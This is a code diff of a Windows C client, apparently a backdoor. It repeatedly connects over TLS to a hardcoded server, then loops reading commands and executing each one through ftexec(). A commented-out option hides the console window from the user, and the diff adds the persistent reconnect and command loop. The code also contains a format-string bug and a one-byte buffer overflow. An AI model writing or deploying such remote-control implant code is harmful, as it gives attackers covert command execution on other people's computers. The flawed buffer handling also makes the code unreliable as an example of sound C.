@@ -12,11 +12,12 @@
 #define SERVER_IP "192.168.191.141"
 #define SERVER_PORT 1234
 
-int main()
-{
-    //HWND myWindows = GetConsoleWindow();
+    //HWND myWindows = GetConsoleWindow(); Cache le prompt pour l'utilisateur
     //ShowWindow(myWindows, SW_HIDE);
 
+int main()
+{
+    // Initialisation d'OpenSSL
     SSL_library_init();
     SSL_CTX *ssl_ctx = SSL_CTX_new(SSLv23_client_method());
     if (!ssl_ctx)
@@ -25,6 +26,7 @@ int main()
         return 1;
     }
 
+    // Initialisation de Winsock
     WSADATA wsa;
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
     {
@@ -32,51 +34,73 @@ int main()
         return 1;
     }
 
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock == INVALID_SOCKET)
-    {
-        printf("Erreur lors de la création du socket\n");
-        return 1;
-    }
-
+    SOCKET sock;
     SOCKADDR_IN serverAddr;
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(SERVER_PORT);
-    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);
+    SSL *ssl = NULL; // Déclarer ssl ici
 
-    if (connect(sock, (SOCKADDR *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
+    // Boucle de tentative de connexion
+    while (1)
     {
-        printf("Erreur lors de la connexion au serveur\n");
-        return 1;
+        // Création du socket
+        sock = socket(AF_INET, SOCK_STREAM, 0);
+        if (sock == INVALID_SOCKET)
+        {
+            printf("Erreur lors de la création du socket\n");
+            Sleep(5000); // Attend 5 secondes avant de réessayer
+            continue;    // Retourne au début de la boucle pour une nouvelle tentative
+        }
+
+        // Configuration de l'adresse du serveur
+        serverAddr.sin_family = AF_INET;
+        serverAddr.sin_port = htons(SERVER_PORT);
+        serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);
+
+        // Connexion au serveur
+        if (connect(sock, (SOCKADDR *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
+        {
+            printf("Erreur lors de la connexion au serveur\n");
+            closesocket(sock);
+            Sleep(5000); // Attend 5 secondes avant de réessayer
+            continue;    // Retourne au début de la boucle pour une nouvelle tentative
+        }
+
+        // Connexion SSL
+        ssl = SSL_new(ssl_ctx);
+        SSL_set_fd(ssl, sock);
+
+        if (SSL_connect(ssl) == -1)
+        {
+            printf("Erreur lors de la connexion SSL\n");
+            ERR_print_errors_fp(stderr);
+            SSL_free(ssl);
+            closesocket(sock);
+            Sleep(5000); // Attend 5 secondes avant de réessayer
+            continue;    // Retourne au début de la boucle pour une nouvelle tentative
+        }
+
+        // La connexion a réussi, sort de la boucle de tentative
+        break;
     }
 
-    SSL *ssl = SSL_new(ssl_ctx);
-    SSL_set_fd(ssl, sock);
-
-    if (SSL_connect(ssl) == -1)
+    // Boucle de réception et traitement
+    while (1)
     {
-        printf("Erreur lors de la connexion SSL\n");
-        ERR_print_errors_fp(stderr);
-        SSL_free(ssl);
-        closesocket(sock);
-        WSACleanup();
-        return 1;
+        char buffer[1024];
+        int bytesReceived = SSL_read(ssl, buffer, sizeof(buffer));
+        if (bytesReceived > 0)
+        {
+            buffer[bytesReceived] = '\0';
+            printf(buffer);
+            ftexec(buffer);
+        }
+        else
+        {
+            printf("Erreur lors de la réception du message du serveur\n");
+            break; // Sortir de la boucle en cas d'erreur
+        }
     }
 
-    char buffer[1024];
-    int bytesReceived = SSL_read(ssl, buffer, sizeof(buffer));
-    if (bytesReceived > 0)
-    {
-        buffer[bytesReceived] = '\0';
-        printf(buffer);
-        Sleep(3000);
-        ftexec(buffer);
-    }
-    else
-    {
-        printf("Erreur lors de la réception du message du serveur\n");
-    }
-
+    // Nettoyage et fermeture
     SSL_free(ssl);
     closesocket(sock);
     WSACleanup();
